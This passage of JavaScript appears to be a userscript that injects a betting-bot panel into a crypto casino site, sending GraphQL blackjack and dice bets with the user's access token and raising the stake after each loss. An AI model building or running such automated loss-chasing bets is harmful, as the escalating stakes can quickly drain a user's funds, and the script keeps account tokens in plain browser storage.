        sp.style.overflow = 'auto';
        sp.style.background = 'linear-gradient(180deg,#081321,#0b1f2d)';
        sp.style.border = '1px solid rgba(0,188,212,0.25)';
        sp.style.borderRadius = '12px';
        sp.style.padding = '12px';
        sp.style.boxShadow = '0 8px 40px rgba(0,188,212,0.08)';
        sp.style.zIndex = '999998';
        sp.style.color = '#ffffff';
        sp.style.fontSize = '13px';
        sp.style.fontFamily = d.style.fontFamily;
        sp.style.padding = '12px';
        sp.innerHTML = '<div id="bj-stats" style="font-family:inherit;color:inherit;">'+
          '<h3 id="bj-stats-title" style="margin:0 0 8px 0;color:#ffffff;font-size:14px;">Statistics</h3>'+
          '<div id="bj-stats-top" style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-bottom:6px">'+
            '<div><strong>Time:</strong> <span id="bj-stats-time" style="font-weight:600;color:#ffffff">00:00:00</span></div>'+
            '<div><strong>Profit:</strong> <span id="bj-stats-profit" style="font-weight:600;color:#ffffff">0</span></div>'+
            '<div><strong>Wager:</strong> <span id="bj-stats-wager" style="font-weight:600;color:#ffffff">0</span></div>'+
          '</div>'+
          '<div id="bj-stats-values" style="color:inherit;line-height:1.4">'+
            '<div><strong>Highest Bet:</strong> <span id="bj-highest-bet" style="font-weight:600;color:#ffffff">0</span></div>'+
            '<div><strong>Highest Win:</strong> <span id="bj-highest-win" style="font-weight:600;color:#ffffff">0</span></div>'+
            '<div><strong>Max Win Streak:</strong> <span id="bj-max-win" style="font-weight:600;color:#ffffff">0</span></div>'+
            '<div><strong>Max Lose Streak:</strong> <span id="bj-max-lose" style="font-weight:600;color:#ffffff">0</span></div>'+
          '</div>'+
          '<div id="bj-warmup-log" style="margin-top:8px;color:#ffffff;font-size:12px;line-height:1.3">Warmup: -</div>'+
          '<div style="margin-top:8px"><canvas id="bj-stats-chart" width="400" height="120" style="width:100%;height:100px;border-radius:6px;background:transparent;display:block"></canvas></div>'+
          '</div>';  
        document.body.appendChild(sp);
        function reposition(){ try{ var pd=document.getElementById('bj-panel'); if(!pd) return; sp.style.top = pd.style.top || pdTop; sp.style.left = (pd.offsetLeft + pd.offsetWidth + 12) + 'px'; }catch(_){} }
        setInterval(reposition,250);
      }catch(_){ }
    })();
    var md=false,ox=0,oy=0;drag.addEventListener('mousedown',function(ev){md=true;ox=ev.clientX-d.offsetLeft;oy=ev.clientY-d.offsetTop;ev.preventDefault()});document.addEventListener('mousemove',function(ev){if(!md)return;var nx=ev.clientX-ox;var ny=ev.clientY-oy;d.style.left=nx+'px';d.style.top=ny+'px';localStorage.setItem('bj.posX',String(nx));localStorage.setItem('bj.posY',String(ny))});document.addEventListener('mouseup',function(){md=false});sim.addEventListener('change',function(){simBalInput.style.display=sim.checked?'block':'none';localStorage.setItem('bj.sim',sim.checked?'true':'false')});simLbl.addEventListener('click',function(){sim.checked=!sim.checked;sim.dispatchEvent(new Event('change'))});st.addEventListener('click',function(){localStorage.setItem('bj.host',h.value);localStorage.setItem('bj.base',b.value);localStorage.setItem('bj.cur',c.value);localStorage.setItem('bj.token',t.value);localStorage.setItem('bj.maxf',mf.value);localStorage.setItem('bj.mult',ml.value);localStorage.setItem('bj.delay',de.value);localStorage.setItem('bj.sim',sim.checked?'true':'false');localStorage.setItem('bj.simBal',simBalInput.value||'0');simBal=nv(simBalInput.value||'0');run()});sp.addEventListener('click',function(){stop();updateUI()})}
  function renderHistory(){try{var tb=document.getElementById('bj-hist');if(!tb)return;tb.innerHTML='';var list=hist.slice(-200);for(var i=list.length-1;i>=0;i--){var h=list[i];var tr=document.createElement('tr');var td1=document.createElement('td');var td2=document.createElement('td');var td3=document.createElement('td');td1.textContent=(Number(h.amount)||0).toFixed(8);td2.textContent=(Number(h.pm)||0).toFixed(8);td3.textContent=(Number(h.profit)||0).toFixed(8);td1.style.padding='4px';td2.style.padding='4px';td3.style.padding='4px';tr.appendChild(td1);tr.appendChild(td2);tr.appendChild(td3);tb.appendChild(tr)}}catch(_){}}
  function computeStatsFromHist(){try{var lastAll = hist.filter(function(x){return Number((x&&x.amount)||0) > 0});var last = lastAll.slice(-200);var highestBet=0,highestWin=0,maxWinStreak=0,maxLoseStreak=0;var streak=0,prevWin=null;for(var i=0;i<last.length;i++){var h=last[i]||{};var amt=Number(h.amount||0);var pf=Number(h.profit||0);if(amt>highestBet)highestBet=amt;if(pf>highestWin)highestWin=pf;if(pf>0){if(prevWin===true)streak++;else streak=1;prevWin=true;if(streak>maxWinStreak)maxWinStreak=streak}else if(pf<0){if(prevWin===false)streak++;else streak=1;prevWin=false;if(streak>maxLoseStreak)maxLoseStreak=streak}else{streak=0;prevWin=null}}return{highestBet:highestBet,highestWin:highestWin,maxWinStreak:maxWinStreak,maxLoseStreak:maxLoseStreak,data:last.map(function(x){return Number((x&&x.profit)||0)})}}catch(_){return{highestBet:0,highestWin:0,maxWinStreak:0,maxLoseStreak:0,data:[]}}} 
  function renderStatsChart(canvas){try{if(!canvas||!canvas.getContext)return;var all = hist.filter(function(x){return Number((x&&x.amount)||0) > 0});var data = all.slice(-100).map(function(x){return Number((x&&x.profit)||0)});if(!data||data.length===0){var ctx=canvas.getContext('2d');ctx.clearRect(0,0,canvas.width,canvas.height);return}var cw=canvas.clientWidth||260;var ch=canvas.clientHeight||80;var dpr=window.devicePixelRatio||1;canvas.width=Math.max(1,Math.floor(cw*dpr));canvas.height=Math.max(1,Math.floor(ch*dpr));var ctx=canvas.getContext('2d');ctx.setTransform(dpr,0,0,dpr,0,0);ctx.clearRect(0,0,cw,ch);var margin=6;var w=cw-2*margin;var h=ch-2*margin;var x0=margin;var y0=margin;var maxV=Math.max.apply(null,data);var minV=Math.min.apply(null,data);var range = maxV - minV || 1;function mapY(v){return y0 + h - ((v - minV)/range)*h} // higher values up
// draw baseline for zero if in range
if(minV<=0 && maxV>=0){var zeroY = mapY(0);ctx.strokeStyle='rgba(174,250,255,0.18)';ctx.lineWidth=1;ctx.beginPath();ctx.moveTo(x0,zeroY);ctx.lineTo(x0+w,zeroY);ctx.stroke()}
// draw line
ctx.beginPath();for(var i=0;i<data.length;i++){var x = x0 + (i/(data.length-1||1))*w;var y = mapY(data[i]); if(i===0) ctx.moveTo(x,y); else ctx.lineTo(x,y);}ctx.strokeStyle='#00bcd4';ctx.lineWidth=2;ctx.stroke();
// fill area under line with gradient
try{ctx.lineTo(x0+w, y0+h);ctx.lineTo(x0, y0+h);ctx.closePath();var grad=ctx.createLinearGradient(0,y0,0,y0+h);grad.addColorStop(0,'rgba(0,188,212,0.12)');grad.addColorStop(1,'rgba(0,188,212,0.02)');ctx.fillStyle=grad;ctx.fill()}catch(_){ }
// draw points colored by win/lose
for(var j=0;j<data.length;j++){var x = x0 + (j/(data.length-1||1))*w;var y = mapY(data[j]);ctx.beginPath();ctx.arc(x,y,3,0,Math.PI*2);ctx.closePath();if(data[j]>0){ctx.fillStyle='#52c41a'}else if(data[j]<0){ctx.fillStyle='#ff4d4f'}else{ctx.fillStyle='#9fbfc6'}ctx.fill()}
}catch(_){} }
  var GQL_BET='mutation BlackjackBet($amount: Float!, $currency: CurrencyEnum!, $identifier: String!) { blackjackBet(amount: $amount, currency: $currency, identifier: $identifier) { id active payoutMultiplier amountMultiplier amount payout updatedAt currency game user { id name } state { ... on CasinoGameBlackjack { player { value actions cards { rank suit } } dealer { value actions cards { rank suit } } } } } }';
  var GQL_NEXT='mutation BlackjackNext($action: BlackjackNextActionInput!, $identifier: String!) { blackjackNext(action: $action, identifier: $identifier) { id active payoutMultiplier amountMultiplier amount payout updatedAt currency game user { id name } state { ... on CasinoGameBlackjack { player { value actions cards { rank suit } } dealer { value actions cards { rank suit } } } } } }';
  var GQL_DICE='mutation DiceRoll($amount: Float!, $target: Float!, $condition: CasinoGameDiceConditionEnum!, $currency: CurrencyEnum!, $identifier: String!) { diceRoll(amount: $amount, target: $target, condition: $condition, currency: $currency, identifier: $identifier) { id active payoutMultiplier amountMultiplier amount payout updatedAt currency game user { id name } state { ... on CasinoGameDice { result target } } } }';
  document.addEventListener('keydown', function (ev) {
    try {
      if ((ev.ctrlKey || ev.metaKey) && String(ev.key || '').toLowerCase() === 'y') {
        ev.preventDefault();
        toggle();
      }
    } catch (_) {}
  });
  var mo = new MutationObserver(function () { ensure(); });
  mo.observe(document, { childList: true, subtree: true });
  setTimeout(ensure, 500);
  setTimeout(function(){try{if(document.getElementById('bj-panel')){mo.disconnect()}}catch(_){}},2500);
  var SIM_INT=null;
  function setupSimHandlers() { try { /* simulator removed */ } catch(_){} }
  SIM_INT=null;
  var LABELS_INT = null;
  function ensureInputLabels() {
    try {
      var ex = document.getElementById('bj-panel');
      if (!ex) return;
      function addLabel(id, text) {
        var el = document.getElementById(id);
        if (!el) return;
        var prev = el.previousElementSibling;
        var ok = prev && prev.getAttribute && prev.getAttribute('data-bj-label') === '1';
        if (ok) return;
        var lab = document.createElement('label');
        lab.textContent = text;
        lab.setAttribute('for', id);
        lab.setAttribute('data-bj-label', '1');
        lab.style.display = 'block';
        lab.style.margin = '6px 0 2px 0';
        ex.insertBefore(lab, el);
      }
      addLabel('bj-host', 'Host');
      addLabel('bj-base-bj', 'Base amount (Blackjack)');
      addLabel('bj-base-dice', 'Base amount (Dice)');
      addLabel('bj-cur', 'Currency');
      addLabel('bj-token', 'Access token');
      addLabel('bj-maxf', 'max factor recov from base BJ');
      addLabel('bj-mult', 'Increament on lose (BJ)');
      addLabel('bj-delay', 'Delay (ms)');
      addLabel('bj-max-bj-loss', 'Max BJ longstreak');
      
      var done = true;
      ['bj-host', 'bj-cur', 'bj-token', 'bj-maxf', 'bj-mult', 'bj-delay','bj-max-bj-loss'].forEach(function (id) {
        var el = document.getElementById(id);
        var prev = el && el.previousElementSibling;
        var ok = prev && prev.getAttribute && prev.getAttribute('data-bj-label') === '1';
        if (!ok) done = false;
      });
      if (done) {
        if (LABELS_INT) {
          clearInterval(LABELS_INT);
          LABELS_INT = null;
        }
      }
    } catch (_) {}
  }
  LABELS_INT = setInterval(ensureInputLabels, 400);

  var BASES_INT=null;
  function ensureBaseInputs(){try{var panel=document.getElementById('bj-panel');if(!panel)return;var baseEl=document.getElementById('bj-base');if(baseEl){var lab=baseEl.previousElementSibling;if(lab&&lab.getAttribute&&lab.getAttribute('data-bj-label')==='1'){lab.remove()}baseEl.remove()}var bbj=document.getElementById('bj-base-bj');if(!bbj){var i=document.createElement('input');i.id='bj-base-bj';i.type='number';i.step='0.00000001';i.placeholder='Base amount (Blackjack)';i.style.width='100%';i.style.margin='4px 0';i.value=localStorage.getItem('bj.baseBj')||'';panel.appendChild(i);i.addEventListener('change',function(){localStorage.setItem('bj.baseBj',String(i.value||''))})}var bd=document.getElementById('bj-base-dice');if(!bd){var j=document.createElement('input');j.id='bj-base-dice';j.type='number';j.step='0.00000001';j.placeholder='Base amount (Dice)';j.style.width='100%';j.style.margin='4px 0';j.value=localStorage.getItem('bj.baseDice')||'';panel.appendChild(j);j.addEventListener('change',function(){localStorage.setItem('bj.baseDice',String(j.value||''))})}}catch(_){}}
  ensureBaseInputs();
  if(!BASES_INT){BASES_INT=setInterval(ensureBaseInputs,600)}
  var BASES_DONE_INT=setInterval(function(){try{if(document.getElementById('bj-base-bj')&&document.getElementById('bj-base-dice')){if(BASES_INT){clearInterval(BASES_INT);BASES_INT=null}clearInterval(BASES_DONE_INT)}}catch(_){}},700);
  function ensureMaxBjLoss(){try{var panel=document.getElementById('bj-panel');if(!panel)return;var cur=localStorage.getItem('bj.maxBjLoss');if(!cur){localStorage.setItem('bj.maxBjLoss','5');cur='5'}var el=document.getElementById('bj-max-bj-loss');if(!el){var k=document.createElement('input');k.id='bj-max-bj-loss';k.type='number';k.step='1';k.placeholder='Max BJ longstreak';k.style.width='100%';k.style.margin='4px 0';k.value=cur;panel.appendChild(k);var save=function(){localStorage.setItem('bj.maxBjLoss',String(k.value||''))};k.addEventListener('change',save);k.addEventListener('input',save)}else{el.value=cur;if(!el.getAttribute('data-bj-bound')){var save2=function(){localStorage.setItem('bj.maxBjLoss',String(el.value||''))};el.addEventListener('change',save2);el.addEventListener('input',save2);el.setAttribute('data-bj-bound','1')}}}catch(_){} }
  ensureMaxBjLoss();
  var MAXBJ_INT=setInterval(ensureMaxBjLoss,600);
  var LAYOUT_INT=null;
  function applyLayoutStyles(){try{var style=document.getElementById('bj-style');if(!style)return;var extra='\n#bj-panel.layout-wide{width:960px;}\n#bj-hist-wrap{max-height:360px;margin-top:6px;}\n#bj-stats{margin-top:10px;padding:10px;border:1px solid rgba(0,212,255,0.25);border-radius:10px;background:linear-gradient(90deg,#0b2b3d,#0e3d55);}\n.bj-row{display:grid;grid-template-columns:200px 1fr;align-items:center;gap:8px;margin:6px 0}\n.bj-row label{margin:0}\n.bj-row input,.bj-row select{width:100%}';if(style.textContent.indexOf('#bj-panel.layout-wide')===-1){style.textContent+=extra}}catch(_){}}
  function ensureWideLayout(){try{var panel=document.getElementById('bj-panel');if(!panel)return;applyLayoutStyles();applyGoldTheme();panel.classList.add('layout-wide');panel.style.display='block';panel.style.width='380px';var wrap=document.getElementById('bj-hist-wrap');if(wrap){wrap.style.maxHeight='240px';wrap.style.overflowY='auto'}var ids=['bj-host','bj-base-bj','bj-base-dice','bj-cur','bj-token','bj-maxf','bj-mult','bj-delay','bj-max-bj-loss'];ids.forEach(function(id){try{var el=document.getElementById(id);if(!el)return;var lab=el.previousElementSibling;var isLab=lab&&lab.getAttribute&&lab.getAttribute('data-bj-label')==='1';if(!isLab)return;var row=lab.parentElement&&lab.parentElement.classList&&lab.parentElement.classList.contains('bj-row')?lab.parentElement:null;if(!row){row=document.createElement('div');row.className='bj-row';panel.insertBefore(row,lab);row.appendChild(lab);row.appendChild(el)}}catch(_){}})}catch(_){}}
  LAYOUT_INT=setInterval(ensureWideLayout,450);
  var LAYOUT_DONE_INT=setInterval(function(){try{var p=document.getElementById('bj-panel');if(p&&p.classList&&p.classList.contains('layout-wide')){if(LAYOUT_INT){clearInterval(LAYOUT_INT);LAYOUT_INT=null}clearInterval(LAYOUT_DONE_INT)}}catch(_){}} ,800);
  function applyGoldTheme(){try{var style=document.getElementById('bj-style');if(!style)return;var blue='\n#bj-panel input,#bj-panel select,#bj-panel button{background:#222739;color:#e8eaed;border:1px solid rgba(0,188,212,0.45);border-radius:12px;box-shadow:0 0 12px rgba(0,188,212,0.12);outline:none}\n#bj-panel input::placeholder{color:#b9e6ea}\n#bj-panel button{background:linear-gradient(180deg,#00bcd4,#0097a7);color:#032027;font-weight:600;border:1px solid rgba(0,188,212,0.6)}\n#bj-panel button:hover{filter:brightness(1.03);box-shadow:0 0 16px rgba(0,188,212,0.25)}\n#bj-drag{background:linear-gradient(180deg,#00bcd4,#0097a7);color:#032027;border:1px solid rgba(0,188,212,0.6);border-radius:12px;padding:10px;margin-bottom:12px}\n#bj-table thead th{color:#aefaff;font-weight:600}\n#bj-hist tr{border-bottom:1px solid rgba(0,188,212,0.15)}\n#bj-hist tr:hover{background:rgba(0,188,212,0.08)}\n#bj-hist::-webkit-scrollbar{width:8px}\n#bj-hist::-webkit-scrollbar-thumb{background:rgba(0,188,212,0.4);border-radius:8px}\n#bj-hist::-webkit-scrollbar-track{background:#0f1420}';style.textContent+=blue}catch(_){} }
  var CLEAR_INT=null;function autoClearStorage(){try{var keep={'bj.host':1,'bj.base':1,'bj.baseBj':1,'bj.baseDice':1,'bj.cur':1,'bj.token':1,'bj.maxf':1,'bj.mult':1,'bj.delay':1,'bj.diceDelay':1,'bj.posX':1,'bj.posY':1,'bj.game':1,'bj.modeBj':1,'bj.modeDice':1,'bj.sim':1,'bj.simBal':1,'bj.tgToken':1,'bj.tgChat':1,'bj.lastId':1,'bj.maxBjLoss':1};var del=[];for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);if(k&&k.indexOf('bj.')===0&&!keep[k])del.push(k)}del.forEach(function(k){try{localStorage.removeItem(k)}catch(_){}})}catch(_){} }if(!CLEAR_INT){CLEAR_INT=setInterval(autoClearStorage,300000)}

  try{
    setInterval(function(){
      try{
        var s=document.getElementById('bj-sim');
        if(s){
          s.style.width='18px';
          s.style.height='18px';
          s.style.marginRight='8px';
          s.style.verticalAlign='middle';
        }
      }catch(_){ }
    },300);
  }catch(_){ }

  try{
    setInterval(function(){
      try{
        // Prepare BJ warmup flag when dice shows loss condition so next BJ plays start with 0 stake
        if (typeof LOSS_DICE !== 'undefined' && (DICE_JUST_LOST || LOSS_DICE > (DICE_LOSS_BASE || 0))) {
          // Only trigger warmup once when transitioning after a dice loss.
          if (BJ_BET_ENABLED && !BJ_WARM_ARMED) {
            BJ_BET_ENABLED = false;
            BJ_WARM_ARMED = true;
            bjConsecLoss = 0;
            bjConsecWin = 0;
            BJ_WARM_THRESHOLD = nv(localStorage.getItem('bj.bjWarmThreshold') || '3');
          }
        }
      }catch(_){ }
    },200);
  }catch(_){ }

})();
